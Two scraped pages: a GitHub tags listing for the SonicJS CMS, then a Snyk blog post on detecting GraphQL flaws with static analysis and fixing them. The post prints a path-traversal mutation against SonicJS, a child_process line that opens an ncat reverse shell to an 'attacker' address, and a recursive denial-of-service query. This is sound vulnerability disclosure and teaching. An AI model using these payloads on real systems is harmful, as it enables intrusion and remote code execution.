=== Content from github.com_eccdd99b_20250114_225907.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flane711%2Fsonicjs%2Ftags)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flane711%2Fsonicjs%2Ftags)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Ftag_history&source=header-repo&source_repo=lane711%2Fsonicjs)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[lane711](/lane711)
/
**[sonicjs](/lane711/sonicjs)**
Public

* [Notifications](/login?return_to=%2Flane711%2Fsonicjs) You must be signed in to change notification settings
* [Fork
  122](/login?return_to=%2Flane711%2Fsonicjs)
* [Star
   946](/login?return_to=%2Flane711%2Fsonicjs)

* [Code](/lane711/sonicjs)
* [Issues
  8](/lane711/sonicjs/issues)
* [Pull requests
  7](/lane711/sonicjs/pulls)
* [Discussions](/lane711/sonicjs/discussions)
* [Actions](/lane711/sonicjs/actions)
* [Projects
  0](/lane711/sonicjs/projects)
* [Wiki](/lane711/sonicjs/wiki)
* [Security](/lane711/sonicjs/security)
* [Insights](/lane711/sonicjs/pulse)

Additional navigation options

* [Code](/lane711/sonicjs)
* [Issues](/lane711/sonicjs/issues)
* [Pull requests](/lane711/sonicjs/pulls)
* [Discussions](/lane711/sonicjs/discussions)
* [Actions](/lane711/sonicjs/actions)
* [Projects](/lane711/sonicjs/projects)
* [Wiki](/lane711/sonicjs/wiki)
* [Security](/lane711/sonicjs/security)
* [Insights](/lane711/sonicjs/pulse)

# Tags: lane711/sonicjs

[Releases](/lane711/sonicjs/releases)
[Tags](/lane711/sonicjs/tags)

Tags

## [v0.1.3](/lane711/sonicjs/releases/tag/v0.1.3)

Toggle v0.1.3's commit message

```
0.1.3

```

* Dec 23, 2024
* [ec485bc](/lane711/sonicjs/commit/ec485bce8573ab5f8591008c21916fac3ce11db2)
* [zip](/lane711/sonicjs/archive/refs/tags/v0.1.3.zip)
* [tar.gz](/lane711/sonicjs/archive/refs/tags/v0.1.3.tar.gz)

## [v.0.7.0](/lane711/sonicjs/releases/tag/v.0.7.0)

Toggle v.0.7.0's commit message

Verified

# Verified

This commit was created on GitHub.com and signed with GitHubâ€™s **verified signature**.
The key has expired.

GPG key ID: 4AEE18F83AFDEB23
Expired

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits)

```
Merge pull request [#149](https://github.com/lane711/sonicjs/pull/149) from pietru2004/main

Fix for firefox
```

* Sep 6, 2022
* [f85b9a6](/lane711/sonicjs/commit/f85b9a644ea7c3583cedd2f5f23be818facf799b)
* [zip](/lane711/sonicjs/archive/refs/tags/v.0.7.0.zip)
* [tar.gz](/lane711/sonicjs/archive/refs/tags/v.0.7.0.tar.gz)
* [Notes](/lane711/sonicjs/releases/tag/v.0.7.0)

## [v0.6.0](/lane711/sonicjs/releases/tag/v0.6.0)

Toggle v0.6.0's commit message

```
add optin report

```

* May 10, 2022
* [75b3e4e](/lane711/sonicjs/commit/75b3e4e8ebd466fe19be1d7b96f076bfa1a38144)
* [zip](/lane711/sonicjs/archive/refs/tags/v0.6.0.zip)
* [tar.gz](/lane711/sonicjs/archive/refs/tags/v0.6.0.tar.gz)
* [Notes](/lane711/sonicjs/releases/tag/v0.6.0)

## [v0.5.4](/lane711/sonicjs/releases/tag/v0.5.4)

Toggle v0.5.4's commit message

```
cleanup fix file

```

* Mar 17, 2022
* [5ec9b39](/lane711/sonicjs/commit/5ec9b390e5eb8feb3588c69dfc3beda0fa8d162e)
* [zip](/lane711/sonicjs/archive/refs/tags/v0.5.4.zip)
* [tar.gz](/lane711/sonicjs/archive/refs/tags/v0.5.4.tar.gz)
* [Notes](/lane711/sonicjs/releases/tag/v0.5.4)

## [v0.4.4](/lane711/sonicjs/releases/tag/v0.4.4)

Toggle v0.4.4's commit message

```
change default theme

```

* Jun 24, 2021
* [8ea986b](/lane711/sonicjs/commit/8ea986b6448e46e9a3177f5e0281750a481e757d)
* [zip](/lane711/sonicjs/archive/refs/tags/v0.4.4.zip)
* [tar.gz](/lane711/sonicjs/archive/refs/tags/v0.4.4.tar.gz)
* [Notes](/lane711/sonicjs/releases/tag/v0.4.4)

## [v0.4.2](/lane711/sonicjs/releases/tag/v0.4.2)

Toggle v0.4.2's commit message

```
0.4.2

```

* Jun 24, 2021
* [38f632a](/lane711/sonicjs/commit/38f632a63eecd7f9c17891f3a8b289ff1a735e6f)
* [zip](/lane711/sonicjs/archive/refs/tags/v0.4.2.zip)
* [tar.gz](/lane711/sonicjs/archive/refs/tags/v0.4.2.tar.gz)

## [v0.4.0](/lane711/sonicjs/releases/tag/v0.4.0)

Toggle v0.4.0's commit message

```
0.4.0

```

* May 22, 2021
* [f0e5d74](/lane711/sonicjs/commit/f0e5d74963ec378991aa8cc21c5a4068e7aa41ba)
* [zip](/lane711/sonicjs/archive/refs/tags/v0.4.0.zip)
* [tar.gz](/lane711/sonicjs/archive/refs/tags/v0.4.0.tar.gz)

## [v0.3.3](/lane711/sonicjs/releases/tag/v0.3.3)

Toggle v0.3.3's commit message

```
0.3.3

```

* May 22, 2021
* [68725e9](/lane711/sonicjs/commit/68725e9543a97457164f50a73741b48ea6558c88)
* [zip](/lane711/sonicjs/archive/refs/tags/v0.3.3.zip)
* [tar.gz](/lane711/sonicjs/archive/refs/tags/v0.3.3.tar.gz)

## [Beta-0.3.1](/lane711/sonicjs/releases/tag/Beta-0.3.1)

Toggle Beta-0.3.1's commit message

```
version bump

```

* Apr 12, 2021
* [903cacd](/lane711/sonicjs/commit/903cacd6af0441d416c338d6200471a6f9dc2bce)
* [zip](/lane711/sonicjs/archive/refs/tags/Beta-0.3.1.zip)
* [tar.gz](/lane711/sonicjs/archive/refs/tags/Beta-0.3.1.tar.gz)
* [Notes](/lane711/sonicjs/releases/tag/Beta-0.3.1)

## [v0.3.0](/lane711/sonicjs/releases/tag/v0.3.0)

Toggle v0.3.0's commit message

```
readme update

```

* Feb 20, 2021
* [2f3f3bb](/lane711/sonicjs/commit/2f3f3bba2888e4aae095137f3b09ac595163fae2)
* [zip](/lane711/sonicjs/archive/refs/tags/v0.3.0.zip)
* [tar.gz](/lane711/sonicjs/archive/refs/tags/v0.3.0.tar.gz)
* [Notes](/lane711/sonicjs/releases/tag/v0.3.0)

Previous[Next](/lane711/sonicjs/tags?after=v0.3.0)

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.



=== Content from snyk.io_d9c5465e_20250114_225908.html ===
You need to enable JavaScript to run this app.[Skip to main content](#main-content)

* Products

  Products

  + [What is Snyk?

    Developer-first security in action](/product/)
  + [Snyk Code

    Secure your code as it's written](/product/snyk-code/)
  + [Snyk Open Source

    Avoid vulnerable dependencies](/product/open-source-security-management/)
  + [Snyk Container

    Keep your base images secure](/product/container-vulnerability-management/)
  + [Snyk IaC

    Fix IaC misconfigurations in-code](/product/infrastructure-as-code-security/)
  + [Snyk AppRisk

    Reduce risk across your business](/product/snyk-apprisk/)
  + [Pricing](/plans/)

  Solutions

  + [Why Snyk?

    Modern security in a single platform](/platform/)
  + [Application security

    Build secure, stay secure](/solutions/application-security/)
  + [Software supply chain security

    Mitigate supply chain risk](/solutions/software-supply-chain-security/)
  + [Secure-AI-generated code

    AI writes, Snyk secures](/solutions/secure-ai-generated-code/)
  + [Zero-day vulnerabilities

    Fix the first day with Snyk](/solutions/zero-day-vulnerability-security/)
  + [Security Intelligence

    Comprehensive vulnerability data](/platform/security-intelligence/)

  Platform

  + [DeepCode AI

    Purpose-built security AI](/platform/deepcode-ai/)
  + [Integrations

    SDLC-spanning security](/integrations/)
  + [Code Checker

    Write better code for free](/code-checker/)

  Audience

  + [Snyk for devs

    Dev-centric info on demand](https://go.snyk.io/2024-dev-onboarding.html)
  + [Snyk for government

    Mission-informed AppSec](/government-security-solution/)
  + [Leaders handbook

    SAST essentials for genAI](/lp/securing-ai-generated-code/)![default-report.b205b2e0](https://res.cloudinary.com/snyk/image/upload/v1729618965/default-report.b205b2e0.svg)

  Secure Adoption in Gen AI Era Report

  [Read report](https://go.snyk.io/secure-adoption-in-genai-era.html "Read report")
* Resources

  Our resources

  + [Resource library

    Browse our extensive database](/resource-library/)
  + [Customer resources

    The one stop shop for customers](/customer-resources/)
  + [Ethical hacking

    How ethical hacking can help you](/ethical-hacking-resources/)
  + [Security leaders

    Insights from industry leaders](/security-leaders/)
  + [Top 10 vulns

    See the most common vuln types](/snyk-top-10/)
  + [Blog Section](/blog/)
  + [Snyk's podcasts](/podcasts/the-secure-developer/)
  + [Snykâ€™s YouTube](https://www.youtube.com/snyksec)

  Our ecosystem

  + [Snyk Learn

    Security education from Snyk](https://learn.snyk.io)
  + [Snyk user docs

    Get started with Snyk](https://docs.snyk.io/)
  + [Snyk Support

    How can we help?](https://support.snyk.io/hc/en-us)
  + [Snyk Vuln Database

    Find new vulnerabilities](https://security.snyk.io/)
  + [Snyk Updates

    Stay in the loop](https://updates.snyk.io/)

  Our community

  + [Events & webinars](/events/)
  + [Ambassadors](/snyk-ambassadors/)
  + [Discord channel](https://snyk.co/discordcommunity)![feature-snyk-snowflake](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1717461856%2Ffeature-snyk-snowflake.jpg&w=2560&q=75)

  Extend the power of your AppSec data with the new Snyk and Snowflake integration

  [Read blog](/blog/snyk-snowflake-data-share/ "Read blog")
* Company

  Company

  ## The developer security platform

  Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.

  [More about us](/about/ "More about us")
  + [Our services

    Maximize your AppSec ROI](/services/)
  + [Our customers

    We help customers save time and money](/customers/)
  + [Our partners

    Bringing business class security with partners](/partners/)
  + [Case studies

    Check out our customer stories and stats](/case-studies/)
  + [Newsroom

    See the latest press releases](/news/)
  + [Contact us

    Get in touch with any feedback or questions](/contact-us/)
  + [Careers

    Join Snyk today](/careers/)![Snyk_Probely](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1730905024%2FSnyk_Probely.jpg&w=2560&q=75)

  Snyk Acquires Developer-First DAST Provider Probely

  [Read press release](/news/snyk-acquires-developer-first-dast-provider-probely/ "Read press release")
* [Pricing](/plans/)

ENSelect your languageEnglishDeutschFranÃ§aisæ—¥æœ¬èªžPortuguÃªs (BR)Login

Free and Team Plan Customers

* [Snyk

  app.snyk.io](https://app.snyk.io)

Enterprise Plan Customers

* [*ðŸ‡ºðŸ‡¸*

  Snyk US - 1

  app.snyk.io](https://app.snyk.io)
* [*ðŸ‡ºðŸ‡¸*

  Snyk US - 2

  app.us.snyk.io](https://app.us.snyk.io)
* [*ðŸ‡ªðŸ‡º*

  Snyk EU

  app.eu.snyk.io](https://app.eu.snyk.io)
* [*ðŸ‡¦ðŸ‡º*

  Snyk AU

  app.au.snyk.io](https://app.au.snyk.io)

The region where your data is hosted follows local agreements, and it may not align with your own location. [Find out more](https://docs.snyk.io/working-with-snyk/regional-hosting-and-data-residency).[Sign up](https://app.snyk.io/signup "Sign up")[Book a live demo](/schedule-a-demo/ "Book a live demo")[Snyk Blog](/blog/)
# Improving GraphQL security with static analysis and Snyk Code

Written by: ![Sam Sanoop](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1530707820%2Fwordpress-sync%2FT07BJB8CR-UH3AUQ0AJ-f7eb7a848178-512.jpg&w=48&q=75)

Sam Sanoop

![wordpress-sync/feature-snyk-code-orange](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1530707820%2Fwordpress-sync%2Ffeature-snyk-code-orange.jpg&w=2560&q=75)

April 12, 2022

 0 mins read

GraphQL is an API query language developed by Facebook in 2015. Since then, its unique features and capabilities have made it a viable alternative to REST APIs. When it comes to security, GraphQL servers can house several types of misconfigurations that result in data compromise, access control issues, and other high risk vulnerabilities.

While security issues with GraphQL are widely known, thereâ€™s little information on finding themÂ  outside of using dynamic analysis. In this post, weâ€™ll discuss how common GraphQL vulnerabilities present in a codebase, as well as and how to find them using [static analysis tools](/learn/application-security/static-application-security-testing/) and GraphQL Security. Since many widely used GraphQL frameworks exist within npm, weâ€™ll focus on examples from the NodeJS ecosystem.

## Taint analysis through GraphQL frameworks

SQL injection and deserialization vulnerabilities have been reported in numerous studies on GraphQL endpoints. An example of this can be seen in HackerOneâ€™s report where a [SQL Injection is present through a GraphQL parameter](https://hackerone.com/reports/435066).

Like REST API parameters, GraphQL arguments are a source of taint where user input can be introduced to an application. Static analysis tools should be able to identify and model these parameters accurately in an application.

In GraphQL frameworks, resolvers map between schema, function, and arguments before being passed through to resolver functions. The following example depicts the **args** argument as an object that contains all GraphQL arguments that were provided for the field by the GraphQL operation.

```
1const resolvers = {
2  Query: {
3    user(parent, args, context, info) {
4      return runFunction(args.parameter);
5    }
6  }
7}
```

These `args` expressions can be traced by the [Snyk Code](/product/snyk-code/) engine, which leverages points-to analysis and typestate analysis to accurately record program execution. The [Snyk Code analysis of SonicJS](https://github.com/lane711/sonicjs), a modern open source NodeJs based content management system, is a helpful example.

SonicJS helps users conduct CMS operations through their GraphQL endpoint. One such operation is the `fileUpdate` mutation operation which allows a user to update their files.

```
1    fileUpdate: {
2      type: FileType,
3      args: {
4        filePath: { type: new GraphQLNonNull(GraphQLString) },
5        fileContent: { type: new GraphQLNonNull(GraphQLString) },
6        sessionID: { type: GraphQLString },
7      },
8      resolve(parent, args) {
9        fileService.writeFile(args.filePath, args.fileContent);
10        let fileData = new FileData(args.filePath, args.fileContent);
11        return fileData;
12      },
13
```

([source code](https://github.com/lane711/sonicjs/blob/master/server/schema/schema.js#L697-L708))

This mutation query takes user-provided input called`args.filePath`and `args.fileContent` and this is then provided to the `writeFile` function of the `fileService` object. The function implementation of the `fileService` object exists in `server/services/file.service.js`and can be seen below.

```
1    writeFile: async function (filePath, fileContent) {
2      Let fullPath = path.join(this.getRootAppPath(), filePath);
3      Await fsPromise.writeFile(fullPath, fileContent);
4    },
```

([source code](https://github.com/lane711/sonicjs/blob/master/server/services/file.service.js#L96))

This function takes both GraphQL arguments and uses the `fs.writeFile` function to update the file on the provided path. However, this function can be exploited to traverse the given application directory and create a new file anywhere in the target system, like in the following GraphQL query:

```
1mutation {
2
3fileUpdate(
4filePath: "../../../../../../../../../../../../tmp/test.txt",
5fileContent: "exploitable",
6sessionID:"nosessioncheckinplace"
7){
8filePath
9fileContent
10}
11}
```

This vulnerability makes it possible to execute code on the system by overwriting one of the SonicJS service files with malicious JavaScript that was loaded by the SonicJS system during startup or reboot. For example, the following statement uses the `child_process` function to backdoor the application and connect to an attacker controlled IP address by leveraging the `ncat` program that is installed on the target system.

```
1require("child_process").exec('ncat 127.0.0.1 4445 -e /bin/bash')
```
![wordpress-sync/blog-graphql-security-taint](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1663718140%2Fwordpress-sync%2Fblog-graphql-security-taint.png&w=2560&q=75)

The Snyk Code report for this vulnerability can be seen below:

![wordpress-sync/blog-graphql-security-path-traversal](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1663718143%2Fwordpress-sync%2Fblog-graphql-security-path-traversal.png&w=2560&q=75)

SonicJS can prevent this vulnerability in the future by requiring authentication and authorization for the query, and validating the provided file path to ensure special characters such as `../` are not allowed.

## GraphQL introspection

GraphQLâ€™s introspection system can be used to discover what queries are supported by a GraphQL server. This includes types, fields, queries, mutations, and other information related to a GraphQL schema.

While this is a feature and is not a direct security issue, introspection can often be used to [find hidden functionality that an attacker can abuse](https://hackerone.com/reports/419883).

Within the NodeJS ecosystem, JavaScript frameworks often enable introspection by default, which may not be clear to developers. So, when using the GraphQL framework without specifying settings, like in `express-graphql` below, introspection is enabled automatically.

```
1import express from 'express'
2import graphqlHTTP from 'express-graphql'
3import Myschema from './schema'
4
5const app = express();
6app.use('/graphql', graphqlHTTP((req, res) => ({
7  Schema: MySchema,
8})))
```

An example of this report within Snyk code can be seen below:

![wordpress-sync/blog-graphql-security-introspection](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1663718141%2Fwordpress-sync%2Fblog-graphql-security-introspection.png&w=2560&q=75)

Since there might be legitimate cases where introspection is needed for a production application, this issue was reported as **low risk**.

To disable introspection within `express-graphql` , use the `NoSchemaIntrospectionCustomRule` provided by the `graphql-js`.

```
1import express from 'express'
2import graphqlHTTP from 'express-graphql'
3import Myschema from './schema'
4import { specifiedRules, NoSchemaIntrospectionCustomRule } from 'graphql';
5
6const app = express();
7app.use('/graphql', graphqlHTTP((req, res) => ({
8  Schema: MySchema,
9validationRules: [...specifiedRules, NoSchemaIntrospectionCustomRule],
10})))
```

While having introspection in production can lead to security issues, it is often needed for development. The creators of ApolloServer tackled this issue by [enabling or disabling introspection based on the production status](https://www.apollographql.com/blog/graphql/security/why-you-should-disable-graphql-introspection-in-production/).

```
1// introspection is only enabled based on NODE_ENV
2const apolloServer = new ApolloServer({
3  schema,
4  introspection: process.env.NODE_ENV !== 'production' && CUSTOM_ENV !== 'production',
5});
6export default apolloServer;
```

If using another GraphQL framework, a third-party library such as the [graphql-disable-introspection](https://www.npmjs.com/package/graphql-disable-introspection) package can be used to validate rules within your GraphQL endpoint.

## GraphQL denial of service

Each query has a depth of nested objects that can be processed by a GraphQL endpoint. Most GraphQL frameworks do not have a default depth limit. Queries with unlimited depths can leave the framework vulnerable to denial of service (DoS) attacks, like in the following example:

```
1{
2    one {
3        two {
4            one {
5                two {
6                    oneâ€¦
7                }
8            }
9        }
10    }
11}
```

However, for this issue to be exploitable, the GraphQL server must have a recursive pattern of field types where a two-way relationship exists. An example of this report within Snyk code can be seen below:

![wordpress-sync/blog-graphql-security-dos](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1663718142%2Fwordpress-sync%2Fblog-graphql-security-dos.png&w=2560&q=75)

This DoS vulnerability was foundÂ  within [mevn-cli](https://github.com/madlabsinc/mevn-cli). To fix this, the [graphql-depth-limit](https://www.npmjs.com/package/graphql-depth-limit)package available through npm can be used as follows:

```
1import depthLimit from 'graphql-depth-limit'
2import express from 'express'
3import graphqlHTTP from 'express-graphql'
4import schema from './schema'
5
6const app = express()
7app.use('/graphql', graphqlHTTP((req, res) => ({
8  schema,
9  validationRules: [ depthLimit(10) ]
10})))
```

Review this [mevn-cli repository commit](https://github.com/madlabsinc/mevn-cli/commit/5f88c24dfe9825349401a4c0b009f57ac31a9099) to see an example of this fix.

Another way to prevent DoS attacks is to check request body length within your GraphQL endpoint. Large queries can be an indication of DoS attacks, so monitoring query length is a simple and effective verification.

```
1// query length is checked here to prevent DoS
2  app.use('/graphql', graphqlExpress((req) => {
3 const query = req.query.query || req.body.query;
4    if (query && query.length > 2000) {
5      // Normal GraphQL queries are not this long
6      // Probably indicates someone trying to send an overly expensive query
7      throw new Error('Query too large.');
8    }
9
10    return {
11      schema,
12      context: Object.assign({}, context),
13      debug: true,
14    };
15  }));
```
## GraphQL injection

By allowing an attacker to interfere with an application query, a GraphQL injection gives malicious parties access to data they normally canâ€™t retrieve â€” including user data or any other data the application can access. In many cases, this data can be modified or deleted, causing persistent changes to the application's content and behavior.

[@octokit/core](https://www.npmjs.com/package/%40octokit/core) is a minimalistic library built to utilize GitHub's REST API and GraphQL API to create GraphQL queries. In cases where user input is used to dynamically create a GraphQL, an attacker might be able to modify this query to access confidential information. An example of this issue can be seen below:

```
1app.get('/', async function(req, res) {
2
3    let user = req.query.page;
4
5    const { articles } = await octokit.graphql(
6        `
7          query lastIssues($owner: String!, $repo: String!) {
8            repository(owner: ${input}, name: $repo) {
9              issues(last: $num) {
10                edges {
11                  node {
12                    title
13                  }
14                }
15              }
16            }
17          }
18        `,
19        {
20          owner: "octokit",
21          repo: "graphql.js",
22        }
23      );
```

An example of this report within Snyk code can be seen below.

![wordpress-sync/blog-graphql-security-unsanitized](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1663718139%2Fwordpress-sync%2Fblog-graphql-security-unsanitized.png&w=2560&q=75)

To prevent GraphQL injection, avoid passing user-entered parameters directly to a GraphQL query. If direct user input is required for performance, validate the input against a very strict allowlist of permitted characters â€” avoiding special characters such as `?` `&` `/` `<` `>` `;` `-` and (space) â€” and use a vendor-supplied escaping routine if possible.

## Conclusion

Snyk Code currently supports the following GraphQL frameworks through a variety of taint analysis and semantic rules:

* `express-graphql`
* `koa-graphql`
* `mercurius`
* `apollo-server`
* `graphql-js`

We hope to add further support for GraphQL vulnerabilities such as insecure object, direct reference, and access control issues. While GraphQL is currently supported for JavaScript, we aim to add more languages and code quality rules to address issues such as batching attacks and query complexity.

## Get started in capture the flag

Learn how to solve capture the flag challenges by watching our virtual 101 workshop on demand.

[Watch now](https://go.snyk.io/240418_ctf-101-workshop.html "Watch now")Posted in:[Code Security](/blog/?topic=code-security)![wordpress-sync/feature-snyk-code-orange](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1530707820%2Fwordpress-sync%2Ffeature-snyk-code-orange.jpg&w=2560&q=75)
### Guide to Choosing a SAST Solution

See the process for assessing, selecting, and implementing a modern SAST solution based on a four phase process and find the best fit for your specific security needs.

[See the guide](https://go.snyk.io/SAST-buyers-guide.html "See the guide")
## Products & Solutions

* [What is Snyk?](/product/)
* [Developer Security Platform](/platform/)
* [Pricing](/plans/)
## Our Resources

* [Resource library](/resource-library/)
* [Blog](/blog/)
* [Snykâ€™s podcasts](/podcasts/the-secure-developer/)
## Our Ecosystem

* [Snyk Learn](/platform/learn/)
* [Snyk User Docs](https://docs.snyk.io/)
* [Snyk Support](https://support.snyk.io/hc/en-us)
* [Snyk Vuln Database](https://security.snyk.io/)
* [Snyk Updates](https://updates.snyk.io/)
* [Snyk Trust Center](https://trust.snyk.io/home)
## Company & Community

* [About Snyk](/about/)
* [Contact us](/contact-us/)
* [Book a demo](/schedule-a-demo/)
* [Careers](/careers/)
* [Events & webinars](/events/)
* [Ambassadors](/snyk-ambassadors/)
## Why Snyk

* [Snyk With GitHub](/comparison/github-and-snyk/)
* [Snyk vs Veracode](/comparison/snyk-vs-veracode/)
* [Snyk vs Checkmarx](/comparison/snyk-vs-checkmarx/)
* [Snyk vs Synopsys](/comparison/snyk-vs-synopsys/)

## The developer security platform

Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.

[More about us](/about/ "More about us")

Â© 2025 Snyk Limited
Registered in England and Wales

* [Legal terms](/policies/terms-of-service/)
* [Privacy Notice](/policies/privacy/)
* [Terms of use](/policies/website-terms-of-use/)
* [California residents: do not sell my information](https://preferences.snyk.io/dont_sell)

